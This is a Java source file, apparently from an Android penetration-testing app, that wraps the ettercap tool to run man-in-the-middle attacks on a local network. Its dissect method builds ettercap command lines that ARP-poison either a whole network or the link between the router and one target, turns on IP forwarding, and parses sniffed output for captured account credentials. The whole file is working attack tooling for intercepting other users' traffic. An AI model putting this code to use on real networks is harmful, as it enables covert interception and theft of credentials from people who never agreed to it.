package com.kenshi.tools;

import android.content.Context;

import com.kenshi.Core.Shell;
import com.kenshi.Core.System;
import com.kenshi.Network.NetworkManager.Target;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Ettercap extends Extender {

    private static final String tag = "ETTERCAP";

    public static abstract class OnAccountListener implements Shell.OutputReceiver {
        private static final Pattern ACCOUNT_PATTERN = Pattern.compile("^([^\\s]+)\\s+:\\s+([^\\:]+):(\\d+).+",
                Pattern.CASE_INSENSITIVE);
        @Override
        public void onStart(String command) {}

        /**
         * @Description: when ettercap is ready, enable ip forwarding
         * @param line:
         */
        @Override
        public void onNewLine(String line) {
            if(line.toLowerCase().contains("for inline help"))
                System.setForwarding(true);
            else {
                Matcher matcher = ACCOUNT_PATTERN.matcher(line);
                if(matcher != null && matcher.find()) {
                    String protocol = matcher.group(1),
                            address = matcher.group(2),
                            port = matcher.group(3);
                    onAccount(protocol, address, port, line);
                }
            }
        }

        @Override
        public void onEnd(int exitCode) {}

        public abstract void onAccount(String protocol, String address, String port, String line);
    }

    public Ettercap(String name, Context context) {
        super(name, context);
    }

    public Ettercap(String name) {
        super(name);
    }

    public Ettercap(Context context) {
        super("ettercap/ettercap" ,context);
    }

    public Thread dissect(Target target, OnAccountListener listener) {
        String commandLine;

        //poision the entire network
        if(target.getType() == Target.Type.NETWORK)
            commandLine = "// //";
        //router -> target poision
        else
            commandLine = "/" + target.getCommandLineRepresentation() + "/ //";

        try {
            //passive dissection, spoofing is performed by arpspoof which is more reliable
            commandLine = "-Tq -i " + System.getNetwork().getNetworkInterface().getDisplayName() +
                    " " + commandLine;
        } catch (Exception e) { System.errorLogging(tag, e); }

        return super.async(commandLine, listener);
    }

    /**
     * @Description: ettercap needs SIGINT (ctrl + c) to restore arp table
     * @return: true if killed
     */
    public boolean kill() { return super.kill("SIGINT"); }
}
